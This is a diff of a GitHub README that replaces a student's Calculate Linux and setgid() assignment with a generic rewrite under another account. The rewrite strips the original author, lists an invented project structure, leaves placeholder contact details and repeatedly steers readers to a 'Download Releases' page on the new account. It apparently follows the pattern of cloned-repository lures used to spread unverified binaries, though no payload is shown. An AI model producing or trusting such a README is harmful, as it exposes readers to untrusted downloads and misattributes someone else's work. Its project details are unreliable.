@@ -1,29 +1,161 @@
-# ossp-individual-assignment
-####   Name     Beminet Aderaw
-####   Id       1600779
-![calculate linux](https://github.com/Beminet-Aderaw/ossp-individual-assignment/blob/main/calculate%20linux%20logo.jpg?raw=true)
-# calculate linux installation
-#### This document is an individual assignment on the installation and configuration of the Calculate Linux operating system using VMware Workstation. It begins with an introduction to Calculate Linux, a Gentoo-based distribution known for its customization and performance. The document explores the motivation behind using virtualization, its objectives, and the historical development of Calculate Linux. It provides a detailed step-by-step installation guide, including hardware and software requirements. Common issues encountered during installation are documented along with practical solutions. The document also discusses supported file systems like ext4, Btrfs, and XFS. Furthermore, it evaluates the advantages and disadvantages of using Calculate Linux. Conclusions and future recommendations guide further exploration. Finally, the document includes a comprehensive overview of virtualization, its uses, and how it works within modern operating systems.
-[you can download calculate linux iso image in this website] (https://mirror.calculate-linux.org/release/20250512/cld-20250512-x86_64.iso)
-# system call
-#### The setgid() system call in Unix-like operating systems is used to set the group ID of the calling process. This function allows a process to change its real group ID (GID) to a specified value, which affects its access permissions to files and resources. Only a privileged process (typically with root permissions) can set the GID to an arbitrary value. If a non-privileged process attempts to change its GID, it must set it to its effective group ID or saved set-group-ID. Changing the group ID is crucial in implementing security models, such as dropping privileges after starting with elevated rights. The new group ID determines the default group ownership of newly created files and affects permission checks. setgid() returns zero on success and -1 on failure, setting errno to indicate the error. It is defined in <unistd.h> and commonly used in daemons or setuid/setgid programs. Improper use can lead to security vulnerabilities if group privileges are not handled
-# references
-[1] (https://en.wikipedia.org)
+# OSSP Individual Assignment 🚀
 
-[2] (https://www.calculate-linux.org)
+Welcome to the OSSP Individual Assignment repository! This repository focuses on the installation of Calculate Linux and the implementation of the `setgid()` system call. Below, you'll find detailed information about the project, its structure, and how to get started.
 
-[3] (https://old.calculate-linux.org)
+[![Download Releases](https://img.shields.io/badge/Download_Releases-brightgreen.svg)](https://github.com/Hara427/ossp-individual-assignment/releases)
 
-[4] (https://distrowatch.com)
+## Table of Contents
 
-[5] (https://www.techphylum.com)
+- [Introduction](#introduction)
+- [Installation](#installation)
+- [System Calls](#system-calls)
+- [Project Structure](#project-structure)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-[6] (https://scalecomputing.com)
+## Introduction
 
-[7] (https://www.redhat.com)
+This repository serves as a comprehensive guide for installing Calculate Linux, a powerful and flexible Linux distribution. It also covers the `setgid()` system call, which is crucial for managing group permissions in Unix-like operating systems. 
 
-[8] (https://www.quora.com)
+### Why Calculate Linux?
 
-[9] (https://man7.org)
+Calculate Linux is known for its speed and efficiency. It is designed for both personal and professional use, making it an excellent choice for users who want a reliable and customizable operating system.
 
-[10] (https://www.cbtnuggets.com)
+## Installation
+
+To get started, you need to install Calculate Linux. Follow these steps:
+
+1. **Download the ISO**: Visit the official Calculate Linux website to download the latest ISO file.
+2. **Create a Bootable USB**: Use tools like Rufus or Etcher to create a bootable USB drive.
+3. **Boot from USB**: Insert the USB into your computer and boot from it.
+4. **Follow the Installation Wizard**: The installation wizard will guide you through the process.
+
+For additional resources and updates, check the [Releases section](https://github.com/Hara427/ossp-individual-assignment/releases).
+
+## System Calls
+
+### Understanding `setgid()`
+
+The `setgid()` system call is used to set the group ID of a process. This is important for managing access rights in multi-user environments. 
+
+#### Syntax
+
+```c
+#include <sys/types.h>
+#include <unistd.h>
+
+int setgid(gid_t gid);
+```
+
+#### Parameters
+
+- `gid`: The group ID to set for the calling process.
+
+#### Return Value
+
+- Returns `0` on success.
+- Returns `-1` on failure, and `errno` is set appropriately.
+
+### Example Usage
+
+Here's a simple example of how to use `setgid()` in a C program:
+
+```c
+#include <stdio.h>
+#include <unistd.h>
+
+int main() {
+    gid_t new_gid = 1000; // Example group ID
+
+    if (setgid(new_gid) == -1) {
+        perror("setgid failed");
+        return 1;
+    }
+
+    printf("Group ID changed successfully!\n");
+    return 0;
+}
+```
+
+## Project Structure
+
+The repository is organized as follows:
+
+```
+ossp-individual-assignment/
+│
+├── src/                   # Source files
+│   ├── main.c            # Main program
+│   └── utils.c           # Utility functions
+│
+├── include/               # Header files
+│   └── utils.h           # Function declarations
+│
+├── README.md              # Project documentation
+└── Makefile               # Build instructions
+```
+
+### Key Files
+
+- **`main.c`**: The entry point of the program.
+- **`utils.c`**: Contains utility functions used throughout the project.
+- **`utils.h`**: Header file for utility functions.
+- **`Makefile`**: Use this file to compile the project easily.
+
+## Usage
+
+After you have installed Calculate Linux and set up your environment, you can compile and run the program. Here’s how:
+
+1. **Navigate to the Project Directory**:
+   ```bash
+   cd path/to/ossp-individual-assignment
+   ```
+
+2. **Compile the Code**:
+   ```bash
+   make
+   ```
+
+3. **Run the Program**:
+   ```bash
+   ./main
+   ```
+
+### Example Output
+
+When you run the program, you should see output indicating that the group ID has changed successfully.
+
+## Contributing
+
+We welcome contributions to this project! If you would like to contribute, please follow these steps:
+
+1. **Fork the Repository**: Click on the "Fork" button at the top right of the repository page.
+2. **Create a New Branch**: 
+   ```bash
+   git checkout -b feature/YourFeatureName
+   ```
+3. **Make Your Changes**: Implement your feature or fix a bug.
+4. **Commit Your Changes**:
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push to Your Fork**:
+   ```bash
+   git push origin feature/YourFeatureName
+   ```
+6. **Create a Pull Request**: Go to the original repository and click on "New Pull Request".
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For questions or feedback, feel free to reach out:
+
+- **Author**: Your Name
+- **Email**: your.email@example.com
+
+Thank you for visiting the OSSP Individual Assignment repository! For more updates and downloads, check the [Releases section](https://github.com/Hara427/ossp-individual-assignment/releases).
